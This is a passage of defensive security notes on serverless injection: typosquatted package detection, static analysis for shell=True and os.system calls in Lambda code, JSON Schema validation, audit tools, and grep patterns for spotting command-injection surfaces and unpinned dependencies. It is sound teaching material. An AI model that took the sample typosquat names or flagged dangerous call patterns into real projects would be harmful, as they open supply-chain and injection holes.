**Analogy:** Imagine a food supplier delivering contaminated ingredients to a restaurant. Even if your code is safe, if a library you imported is malicious, you're compromised.

```
Legitimate package:    Typosquatting attack:
requests (real)        reqquests (fake)
boto3 (real)           bot0 (zero instead of o)
numpy (real)           nunpy (n→u typo)
```

### 3.1 Typosquatting Detection

The typosquatting detector analyzes `requirements.txt` files and identifies packages with names suspiciously similar to popular packages (Levenshtein distance ≤ 2). It then checks whether the suspicious package actually exists on PyPI.

**Common typosquatting transformations:**
- Character substitution: `o→0`, `i→l`, `l→1`
- Prefix/suffix additions: `python-requests`, `requests-python`
- Separator changes: `boto-3` vs `boto3`
- Single character deletions or additions

**Levenshtein distance explained:**
- Distance 0 = identical strings
- Distance 1 = one character inserted/deleted/replaced: `boto3` → `b0to3`
- Distance 2 = two such operations: `requests` → `reqquests`

**Usage:**
```bash
python3 typosquat_detector.py requirements.txt -o suspicious.json
```

---

## 4. Serverless OS Command Injection — Static Analysis

The static analysis tool uses Python's `ast` module to parse Lambda function source code and identify dangerous function calls without executing the code.

**Risk classification:**
- **HIGH**: `shell=True` with a dynamically constructed string argument (f-string, concatenation, or function call result)
- **MEDIUM**: `shell=True` with any argument
- **LOW**: Dangerous function without `shell=True`

**Dangerous functions monitored:**
`subprocess.call`, `subprocess.run`, `subprocess.Popen`, `subprocess.check_output`, `subprocess.check_call`, `os.system`, `os.popen`, `os.execv`, `os.execve`, `eval`, `exec`

**Usage:**
```bash
# Analyze a single file
python3 injection_analyzer.py lambda_handler.py

# Analyze a directory (HIGH risk only)
python3 injection_analyzer.py ./src/ --min-risk HIGH
```

---

## 5. Runtime Injection Defense Pattern

**What is JSON Schema validation?** It defines the exact structure that input data must match — like a form template that rejects anything that doesn't fit.

Using AWS Lambda Powertools, a JSON Schema validates all incoming API Gateway events before processing. The schema enforces:
- `user_id` must match UUID v4 format (regex)
- `action` must be one of an enumerated set of allowed values (`read`, `update`, `delete`)
- `data` object cannot have more than 20 properties
- No additional properties are allowed beyond the defined ones

Any validation failure returns HTTP 400 immediately without reaching business logic.

**Why not return detailed error messages?**
Detailed error messages (e.g., "user_id must match pattern X") give attackers hints about the expected format, making it easier to craft valid-looking malicious inputs. Return generic `"Invalid input"` instead.

---

## 6. Reference Tools

| Tool | Purpose | Beginner Difficulty |
|------|---------|---------------------|
| `Semgrep` | Static analysis for serverless code | Low (pre-built rules) |
| `PMapper` | AWS IAM permission graph analysis | Medium |
| `ScoutSuite` | Cloud security auditing | Medium |
| `Prowler` | AWS security configuration audit | Low (automated) |
| `Snyk` | Dependency vulnerability detection | Low (easy CLI) |
| `pip-audit` | Python dependency auditing | Low (one command) |
| `bandit` | Python security linter | Low |
| `checkov` | IaC (Terraform/CFn) security scanning | Medium |

**Recommended starting order for beginners:**
1. `pip-audit` — `pip install pip-audit && pip-audit`
2. `bandit` — `pip install bandit && bandit -r ./src/`
3. `Semgrep` — `semgrep --config=auto ./`
4. `Prowler` — full AWS environment audit

---

## 7. Key Summary

| Attack Type | Root Cause | Defense |
|-------------|------------|---------|
| Command injection | Input passed to shell without validation | Use list args, shell=False |
| Path traversal | Filenames containing ../ | Whitelist validation |
| Typosquatting | Mistyped package installed | pip-audit, verify package names |
| Event injection | Event source data not validated | JSON Schema validation |
| SSRF | URL parameters not validated | URL whitelist |

**Most important principle:** "Never Trust, Always Verify"
Regardless of the event source, treat all input as potentially malicious and validate it before use.

<!-- detect-validate-53 -->
## Serverless Injection Detection and Input Trust-Boundary Validation

Serverless injection hijacks function execution via *event-based injection, dependency attacks, and OS command injection*. Since events come from many sources (API/queue/storage), defenders must confirm **whether all event sources are validated as untrusted**. Validate only on **owned functions**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Event injection | Event trust | Schema/source validation | Anomalous event structure |
| OS command | Shell-call input | Avoid shell, arg arrays | os.system/exec on input |
| Dependency attack | Unpinned packages | Lock, hash-pin | New build hook |
| NoSQL/SQL | Dynamic query | Parameterization | Input concatenated into query |

### Defense validation (verify directly)

```bash
# 1) Command-injection surface in owned function code — event input flowing into a shell is the signal
grep -rInE 'os\.(system|popen)|subprocess\.(call|run|Popen)\(.*shell=True|exec\(' . 2>/dev/null | head
# 2) Dependency-integrity pinning — no hash pins in the lockfile signals a supply-chain injection surface
grep -cE '--hash=sha256:' requirements.txt 2>/dev/null; jq -r '.packages|to_entries[]|select(.value.integrity==null)|.key' package-lock.json 2>/dev/null | head
```

> Serverless-injection defense is *whether all events are validated* -- "the function triggers" differs from "events are schema-validated, input does not flow into a shell, and dependencies are pinned". Confirm on owned functions directly ([[05_Web_Hacking]], [[35_Supply_Chain_Attacks]], [[14_Cloud_Security]]).
